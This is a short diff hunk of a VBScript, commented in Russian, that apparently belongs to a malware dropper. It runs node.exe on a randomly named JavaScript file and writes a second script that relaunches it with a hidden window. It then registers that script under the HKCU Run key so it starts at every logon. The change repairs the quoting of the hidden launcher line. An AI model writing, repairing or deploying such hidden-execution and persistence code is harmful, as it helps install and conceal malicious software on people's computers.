@@ -29,11 +29,12 @@ objShell.Run """" & nodeDir & "\node.exe"" """ & nodeDir & "\awtnzzjjaqeuvbz.js"
 vbsFile = nodeDir & "\gahshccx.vbs"
 Set f = objFSO.CreateTextFile(vbsFile, True)
 f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
-f.WriteLine "sh.Run """" & """ & nodeDir & "\node.exe"" & """" & "" """" & """ & nodeDir & "\awtnzzjjaqeuvbz.js"" & """", 0, False"
+f.WriteLine "sh.Run """"" & nodeDir & "\node.exe"" """"" & nodeDir & "\awtnzzjjaqeuvbz.js"""""", 0, False"
 f.Close
 
 ' === Добавляем в автозагрузку запись на gahshccx.vbs ===
 objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyNodeStartup", "wscript.exe """ & vbsFile & """", "REG_SZ"
+
 
 
 
